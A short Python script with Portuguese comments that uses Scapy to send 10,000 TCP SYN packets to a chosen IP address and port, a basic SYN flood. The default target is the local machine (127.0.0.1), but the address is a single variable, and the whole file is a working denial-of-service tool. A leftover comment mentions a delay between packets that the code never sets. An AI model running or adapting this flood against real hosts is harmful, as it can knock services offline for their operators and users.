from scapy.all import IP, TCP, send
import time

def send_syn_packets(target_ip, target_port, count):
    ip = IP(dst=target_ip)
    syn = TCP(dport=target_port, flags='S')
    
    try:
        for i in range(count):
            send(ip/syn, verbose=False)
            if i % 100 == 0:
                print(f"Enviados {i} pacotes SYN até agora...")
    except KeyboardInterrupt:
        print("Envio de pacotes interrompido pelo usuário.")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Alvo é a própria máquina
    target_port = 80         # Porta alvo (pode ser qualquer porta)
    count = 10000            # Número de pacotes a serem enviados           # Atraso entre pacotes (em segundos)

    send_syn_packets(target_ip, target_port, count)
